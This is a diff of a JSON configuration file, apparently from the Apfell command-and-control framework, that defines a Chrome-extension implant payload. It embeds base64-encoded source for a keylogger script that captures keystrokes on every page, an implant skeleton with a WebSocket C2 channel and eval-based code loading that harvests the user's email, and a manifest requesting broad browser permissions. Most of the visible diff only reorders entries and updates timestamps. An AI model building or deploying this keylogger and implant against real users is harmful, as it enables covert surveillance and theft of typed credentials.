@@ -12,20 +12,20 @@
       "note": "This payload uses javascript, html, and CSS for execution in the context of a browser. The extension code is compiled to work with Chrome but should be compatible with Brave as well. After creating a payload in Apfell, the result will be a zip file that contains a compiled crx file for the extension. It will also contain all of the source code so that you may make changes to the icon or update the extension and recompile.",
       "supports_dynamic_loading": true,
       "deleted": false,
-      "last_heartbeat": "03\/10\/2020 15:44:03",
+      "last_heartbeat": "03\/20\/2020 01:12:50",
       "ptype": "chrome-extension",
       "file_extension": "js",
       "wrapped_payload_type": "null",
       "icon": null,
       "files": [
         {
-          "extension\/icons\/blank.png": "iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGAAAActpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDUuNC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyI+CiAgICAgICAgIDx4bXA6Q3JlYXRvclRvb2w+QWRvYmUgSW1hZ2VSZWFkeTwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KKS7NPQAAATZJREFUeAHt0DEBAAAAwqD1T20MH4hAYcCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMG\/gMDAI8AAVgV38wAAAAASUVORK5CYII="
+          "manifest-template.json": "ewogICJuYW1lIjogIkVYVEVOU0lPTl9OQU1FX1JFUExBQ0UiLAogICJ2ZXJzaW9uIjogIlZFUlNJT05fUkVQTEFDRSIsCiAgIm1hbmlmZXN0X3ZlcnNpb24iOiAyLAogICJkZXNjcmlwdGlvbiI6ICJERVNDUklQVElPTl9SRVBMQUNFIiwKICAiaG9tZXBhZ2VfdXJsIjogImh0dHA6Ly93d3cuZXhhbXBsZS5jb20vZGVidWdleHRlbnNpb24iLAogICJjb250ZW50X3NlY3VyaXR5X3BvbGljeSI6ICJzY3JpcHQtc3JjICdzZWxmJyAndW5zYWZlLWV2YWwnOyBvYmplY3Qtc3JjICdzZWxmJyIsCiAgImNvbnZlcnRlZF9mcm9tX3VzZXJfc2NyaXB0IjogdHJ1ZSwKICAiYmFja2dyb3VuZCI6IHsKICAgICJzY3JpcHRzIjogWwogICAgICAibWFpbi5qcyIKICAgIF0sCiAgICAicGVyc2lzdGVudCI6IHRydWUKICB9LAogICJpY29ucyI6IHsKICAgICIxMjgiOiAiaWNvbnMvYmxhbmsucG5nIgogIH0sCiAgInVwZGF0ZV91cmwiIDogImh0dHA6Ly93d3cuZXhhbXBsZS5jb20vdXBkYXRlLnhtbCIsCiAgInBlcm1pc3Npb25zIjogWwogICAgImJvb2ttYXJrcyIsCiAgICAid2ViTmF2aWdhdGlvbiIsCiAgICAiY2xpcGJvYXJkUmVhZCIsCiAgICAiY2xpcGJvYXJkV3JpdGUiLAogICAgImNvbnRlbnRTZXR0aW5ncyIsCiAgICAiY29udGV4dE1lbnVzIiwKICAgICJjb29raWVzIiwKICAgICJoaXN0b3J5IiwKICAgICJpZGxlIiwKICAgICJtYW5hZ2VtZW50IiwKICAgICJub3RpZmljYXRpb25zIiwKICAgICJ0YWJzIiwKICAgICJpZGVudGl0eSIsCiAgICAiaWRlbnRpdHkuZW1haWwiLAogICAgImFsYXJtcyIsCiAgICAiYmFja2dyb3VuZCIsCiAgICAiYnJvd3NpbmdEYXRhIiwKICAgICJjb250ZW50U2V0dGluZ3MiLAogICAgImNvb2tpZXMiLAogICAgImRlYnVnZ2VyIiwKICAgICJkZWNsYXJhdGl2ZUNvbnRlbnQiLAogICAgImRlc2t0b3BDYXB0dXJlIiwKICAgICJkb3dubG9hZHMiLAogICAgImdjbSIsCiAgICAiaGlzdG9yeSIsCiAgICAiaWRsZSIsCiAgICAicG93ZXIiLAogICAgInByaXZhY3kiLAogICAgInByb3h5IiwKICAgICJzeXN0ZW0uY3B1IiwKICAgICJ0YWJDYXB0dXJlIiwKICAgICJ0YWJzIiwKICAgICJ1bmxpbWl0ZWRTdG9yYWdlIiwKICAgICJ3ZWJSZXF1ZXN0IiwKICAgICJuYXRpdmVNZXNzYWdpbmciLAogICAgImdlb2xvY2F0aW9uIiwKICAgICJ3ZWJSZXF1ZXN0QmxvY2tpbmciLAogICAgImRvd25sb2FkcyIsCiAgICAiZG93bmxvYWRzLm9wZW4iLAogICAgIjxhbGxfdXJscz4iCiAgXQp9Cg=="
         },
         {
           "extension\/utils\/kl.js": "Ly8gSGVhdmlseSBhZGFwdGVkIGZyb20gaHR0cHM6Ly9naXRodWIuY29tL1hlcm9kYXkvQ2hyb21lTG9nZ2VyL2Jsb2IvbWFzdGVyL0Nocm9tZS9zcmMvaW5qZWN0L3BheWxvYWQuanMKdmFyIHBvcnQgPSBjaHJvbWUucnVudGltZS5jb25uZWN0KHtuYW1lOiAia2V5bG9nZ2VyIn0pOwoKaWYgKCFkb2N1bWVudC50aXRsZSkgewogICAgZG9jdW1lbnQudGl0bGUgPSBkb2N1bWVudC5VUkw7Cn0KCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2tleXByZXNzJywgZnVuY3Rpb24oZSkgewogICAgZSA9IGUgfHwgd2luZG93LmV2ZW50OwogICAgdmFyIGNoYXJDb2RlID0gdHlwZW9mIGUud2hpY2ggPT0gIm51bWJlciIgPyBlLndoaWNoIDogZS5rZXlDb2RlOwogICAgaWYoY2hhckNvZGUpIHsKICAgICAgICBsb2coU3RyaW5nLmZyb21DaGFyQ29kZShjaGFyQ29kZSkpOwogICAgfQp9KTsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2tleWRvd24nLCBmdW5jdGlvbiAoZSkgewogICAgZSA9IGUgfHwgd2luZG93LmV2ZW50OwogICAgdmFyIGNoYXJDb2RlID0gdHlwZW9mIGUud2hpY2ggPT0gIm51bWJlciIgPyBlLndoaWNoIDogZS5rZXlDb2RlOwogICAgaWYgKGNoYXJDb2RlID09IDgpIHsKICAgICAgICBsb2coIltCS1NQXSIpOwogICAgfSBlbHNlIGlmIChjaGFyQ29kZSA9PSA5KSB7CiAgICAgICAgbG9nKCJbVEFCXSIpOwogICAgfSBlbHNlIGlmIChjaGFyQ29kZSA9PSAxMykgewogICAgICAgIGxvZygiW0VOVEVSXSIpOwogICAgfSBlbHNlIGlmIChjaGFyQ29kZSA9PSAxNikgewogICAgICAgIGxvZygiW1NISUZUXSIpOwogICAgfSBlbHNlIGlmIChjaGFyQ29kZSA9PSAxNykgewogICAgICAgIGxvZygiW0NUUkxdIik7CiAgICB9IGVsc2UgaWYgKGNoYXJDb2RlID09IDE4KSB7CiAgICAgICAgbG9nKCJbQUxUXSIpOwogICAgfSBlbHNlIGlmIChjaGFyQ29kZSA9PSA5MSkgewogICAgICAgIGxvZygiW0wgV0lORE9XXSIpOyAvLyBjb21tYW5kIGZvciBtYWMKICAgIH0gZWxzZSBpZiAoY2hhckNvZGUgPT0gOTIpIHsKICAgICAgICBsb2coIltSIFdJTkRPV10iKTsgLy8gY29tbWFuZCBmb3IgbWFjCiAgICB9IGVsc2UgaWYgKGNoYXJDb2RlID09IDkzKSB7CiAgICAgICAgbG9nKCJbU0VMRUNUL0NNRF0iKTsgLy8gY29tbWFuZCBmb3IgbWFjCiAgICB9Cn0pOwoKLyogS2V5bG9nIFNhdmluZyAqLwp2YXIgdGltZSA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpOwp2YXIgZGF0YSA9IHt9Owp2YXIgbGFzdExvZyA9IHRpbWU7CgoKZnVuY3Rpb24gbG9nKGlucHV0KSB7CiAgICB2YXIgbm93ID0gbmV3IERhdGUoKS5nZXRUaW1lKCk7CiAgICBpZiAobm93IC0gbGFzdExvZyA8IDEwKSByZXR1cm47CiAgICBkYXRhW3RpbWVdICs9IGlucHV0OwogICAgbGFzdExvZyA9IG5vdzsKICAgIHBvcnQuc2VuZE1lc3NhZ2UoZGF0YSkKfQ=="
         },
         {
-          "manifest-template.json": "ewogICJuYW1lIjogIkVYVEVOU0lPTl9OQU1FX1JFUExBQ0UiLAogICJ2ZXJzaW9uIjogIlZFUlNJT05fUkVQTEFDRSIsCiAgIm1hbmlmZXN0X3ZlcnNpb24iOiAyLAogICJkZXNjcmlwdGlvbiI6ICJERVNDUklQVElPTl9SRVBMQUNFIiwKICAiaG9tZXBhZ2VfdXJsIjogImh0dHA6Ly93d3cuZXhhbXBsZS5jb20vZGVidWdleHRlbnNpb24iLAogICJjb250ZW50X3NlY3VyaXR5X3BvbGljeSI6ICJzY3JpcHQtc3JjICdzZWxmJyAndW5zYWZlLWV2YWwnOyBvYmplY3Qtc3JjICdzZWxmJyIsCiAgImNvbnZlcnRlZF9mcm9tX3VzZXJfc2NyaXB0IjogdHJ1ZSwKICAiYmFja2dyb3VuZCI6IHsKICAgICJzY3JpcHRzIjogWwogICAgICAibWFpbi5qcyIKICAgIF0sCiAgICAicGVyc2lzdGVudCI6IHRydWUKICB9LAogICJpY29ucyI6IHsKICAgICIxMjgiOiAiaWNvbnMvYmxhbmsucG5nIgogIH0sCiAgInVwZGF0ZV91cmwiIDogImh0dHA6Ly93d3cuZXhhbXBsZS5jb20vdXBkYXRlLnhtbCIsCiAgInBlcm1pc3Npb25zIjogWwogICAgImJvb2ttYXJrcyIsCiAgICAid2ViTmF2aWdhdGlvbiIsCiAgICAiY2xpcGJvYXJkUmVhZCIsCiAgICAiY2xpcGJvYXJkV3JpdGUiLAogICAgImNvbnRlbnRTZXR0aW5ncyIsCiAgICAiY29udGV4dE1lbnVzIiwKICAgICJjb29raWVzIiwKICAgICJoaXN0b3J5IiwKICAgICJpZGxlIiwKICAgICJtYW5hZ2VtZW50IiwKICAgICJub3RpZmljYXRpb25zIiwKICAgICJ0YWJzIiwKICAgICJpZGVudGl0eSIsCiAgICAiaWRlbnRpdHkuZW1haWwiLAogICAgImFsYXJtcyIsCiAgICAiYmFja2dyb3VuZCIsCiAgICAiYnJvd3NpbmdEYXRhIiwKICAgICJjb250ZW50U2V0dGluZ3MiLAogICAgImNvb2tpZXMiLAogICAgImRlYnVnZ2VyIiwKICAgICJkZWNsYXJhdGl2ZUNvbnRlbnQiLAogICAgImRlc2t0b3BDYXB0dXJlIiwKICAgICJkb3dubG9hZHMiLAogICAgImdjbSIsCiAgICAiaGlzdG9yeSIsCiAgICAiaWRsZSIsCiAgICAicG93ZXIiLAogICAgInByaXZhY3kiLAogICAgInByb3h5IiwKICAgICJzeXN0ZW0uY3B1IiwKICAgICJ0YWJDYXB0dXJlIiwKICAgICJ0YWJzIiwKICAgICJ1bmxpbWl0ZWRTdG9yYWdlIiwKICAgICJ3ZWJSZXF1ZXN0IiwKICAgICJuYXRpdmVNZXNzYWdpbmciLAogICAgImdlb2xvY2F0aW9uIiwKICAgICJ3ZWJSZXF1ZXN0QmxvY2tpbmciLAogICAgImRvd25sb2FkcyIsCiAgICAiZG93bmxvYWRzLm9wZW4iLAogICAgIjxhbGxfdXJscz4iCiAgXQp9Cg=="
+          "extension\/icons\/blank.png": "iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGAAAActpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDUuNC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyI+CiAgICAgICAgIDx4bXA6Q3JlYXRvclRvb2w+QWRvYmUgSW1hZ2VSZWFkeTwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KKS7NPQAAATZJREFUeAHt0DEBAAAAwqD1T20MH4hAYcCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMG\/gMDAI8AAVgV38wAAAAASUVORK5CYII="
         },
         {
           "chrome-extension.js": "Ly8tLS0tLS0tLS0tLS0tLUlNUExBTlQgSU5GT1JNQVRJT04tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjbGFzcyBpbXBsYW50ewogICAgY29uc3RydWN0b3IoKXsKICAgICAgICB0aGlzLmhvc3RpbmZvID0gImNocm9tZSI7CiAgICAgICAgdGhpcy51c2VyaW5mbyA9ICcnOwogICAgICAgIHRoaXMucHJvY2luZm8gPSAwOwogICAgICAgIHRoaXMudXVpZCA9ICJVVUlEX0hFUkUiOwogICAgICAgIHRoaXMuYXBmZWxsaWQgPSAwOwogICAgfQp9Cgp2YXIgaG9zdG9zID0gIiI7CnZhciBob3N0YXJjaCA9ICIiOwp2YXIgYXBmZWxsID0gbmV3IGltcGxhbnQoKTsKLy8tLS0tLS0tLS0tLS0tLUJhc2UgQzIgSU5GT1JNQVRJT04tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KY2xhc3MgYmFzZUMyIHsKICAgIGNvbnN0cnVjdG9yKGhvc3QsIHBvcnQsIGVuZHBvaW50LCBzc2wsIGludGVydmFsKSB7CiAgICAgICAgdGhpcy5ob3N0ID0gaG9zdDsKICAgICAgICB0aGlzLnBvcnQgPSBwb3J0OwogICAgICAgIHRoaXMucHJvdG8gPSAnJzsKICAgICAgICB0aGlzLmludGVydmFsID0gaW50ZXJ2YWw7CiAgICAgICAgdGhpcy5jb21tYW5kcyA9IHt9OwoKICAgICAgICBpZiAoc3NsID09PSB0cnVlKSB7CiAgICAgICAgICAgIHRoaXMucHJvdG8gPSAnd3NzOi8vJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB0aGlzLnByb3RvID0gJ3dzOi8vJzsKICAgICAgICB9CiAgICAgICAgdGhpcy5zZXJ2ZXIgPSBgJHt0aGlzLnByb3RvfSR7dGhpcy5ob3N0fToke3RoaXMucG9ydH0vJHtlbmRwb2ludH1gOwogICAgfQoKICAgIGdldEludGVydmFsKCl7CiAgICAgICAgcmV0dXJuIHRoaXMuaW50ZXJ2YWw7CiAgICB9CgogICAgZ2V0Q29uZmlnKCl7CiAgICAgICAgLy8gcmV0dXJuIHRoZSBjMiBjb25maWcKICAgIH0KCiAgICBwb3N0UmVzcG9uc2UoKXsKICAgICAgICAvL291dHB1dCBhIHJlc3BvbnNlIHRvIGEgdGFzawogICAgfQogICAgc2V0Q29uZmlnKCl7CiAgICAgICAgLy9Ob3QgaW1wbGVtZW50ZWQKICAgIH0KICAgIGRvd25sb2FkKCl7CiAgICAgICAgLy9Ob3QgSW1wbGVtZW50ZWQKICAgIH0KICAgIHVwbG9hZCgpewogICAgICAgIC8vTm90IGltcGxlbWVudGVkCiAgICB9CgogICAgY2hlY2tJbigpewogICAgICAgIC8vIHJlZ2lzdGVyIHRoaXMgY2FsbGJhY2sgd2l0aCB0aGUgc2VydmVyCiAgICB9CgogICAgc2VuZFJlc3BvbnNlKCl7CiAgICAgICAgLy8gU2VuZCBhIHJlc3BvbnNlIHRvIHRoZSBzZXJ2ZXIKICAgIH0KfQoKLy8gQzIgUHJvZmlsZSBDb2RlCkMyUFJPRklMRV9IRVJFCgovLy0tLS0tLS0tLS0tLS1TSEFSRUQgQ09NTUFORCBDT0RFIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjaHJvbWUuaWRlbnRpdHkuZ2V0UHJvZmlsZVVzZXJJbmZvKGZ1bmN0aW9uKGluZm8pewogICAgYXBmZWxsLnVzZXJpbmZvID0gaW5mby5lbWFpbDsKfSk7CgpjaHJvbWUucnVudGltZS5nZXRQbGF0Zm9ybUluZm8oZnVuY3Rpb24oaW5mbykgewogICAgaG9zdG9zID0gaW5mby5vczsKICAgIGhvc3RhcmNoID0gaW5mby5hcmNoOwp9KTsKCmRlZmF1bHRfbG9hZCA9IGZ1bmN0aW9uKGNvbnRlbnRzKXsKICAgIHZhciBtb2R1bGUgPSB7ZXhwb3J0czoge319OwogICAgdmFyIGV4cG9ydHMgPSBtb2R1bGUuZXhwb3J0czsKICAgIGV2YWwoY29udGVudHMpOwogICAgcmV0dXJuIG1vZHVsZS5leHBvcnRzOwp9OwoKbGV0IGV4cG9ydHMgPSB7fTsKLy8gQ29tbWFuZHMKQ09NTUFORFNfSEVSRQoKdmFyIGNvbW1hbmRzX2RpY3QgPSBleHBvcnRzOwpDMi5jb21tYW5kcyA9IE9iamVjdC5rZXlzKGNvbW1hbmRzX2RpY3QpOw=="
@@ -59,25 +59,11 @@
       ],
       "create_transforms": [
         {
-          "parameter": "1.0",
-          "description": "The version for your extension",
+          "parameter": "example",
+          "description": "The name of your extension",
           "transform": "save_string_parameter",
           "parameter_type": "String",
-          "order": 4
-        },
-        {
-          "parameter": "http:\/\/www.example.com",
-          "description": "The home page url for your extension. This will be used as the default location for when a user clicks on your extension icon in the toolbar",
-          "transform": "save_string_parameter",
-          "parameter_type": "String",
-          "order": 3
-        },
-        {
-          "parameter": "http:\/\/www.example.com\/update.xml",
-          "description": "The URL that hosts the update manifest file (xml)",
-          "transform": "save_string_parameter",
-          "parameter_type": "String",
-          "order": 2
+          "order": 1
         },
         {
           "parameter": "",
@@ -87,11 +73,25 @@
           "order": 5
         },
         {
-          "parameter": "example",
-          "description": "The name of your extension",
+          "parameter": "http:\/\/www.example.com\/update.xml",
+          "description": "The URL that hosts the update manifest file (xml)",
           "transform": "save_string_parameter",
           "parameter_type": "String",
-          "order": 1
+          "order": 2
+        },
+        {
+          "parameter": "http:\/\/www.example.com",
+          "description": "The home page url for your extension. This will be used as the default location for when a user clicks on your extension icon in the toolbar",
+          "transform": "save_string_parameter",
+          "parameter_type": "String",
+          "order": 3
+        },
+        {
+          "parameter": "1.0",
+          "description": "The version for your extension",
+          "transform": "save_string_parameter",
+          "parameter_type": "String",
+          "order": 4
         }
       ],
       "transforms": [
@@ -101,8 +101,8 @@
           "parameter_type": "None",
           "description": "This combines all of the selected commands together",
           "is_command_code": false,
-          "timestamp": "03\/10\/2020 13:31:05",
-          "id": 1,
+          "timestamp": "03\/20\/2020 01:01:59",
+          "id": 9,
           "operator": "apfell_admin"
         },
         {
@@ -111,8 +111,8 @@
           "parameter_type": "String",
           "description": "Save a string parameter to saved_array",
           "is_command_code": false,
-          "timestamp": "03\/10\/2020 13:31:05",
-          "id": 2,
+          "timestamp": "03\/20\/2020 01:01:59",
+          "id": 7,
           "operator": "apfell_admin"
         },
         {
@@ -121,8 +121,8 @@
           "parameter_type": "String",
           "description": "",
           "is_command_code": false,
-          "timestamp": "03\/10\/2020 13:31:05",
-          "id": 3,
+          "timestamp": "03\/20\/2020 01:01:59",
+          "id": 10,
           "operator": "apfell_admin"
         }
       ],
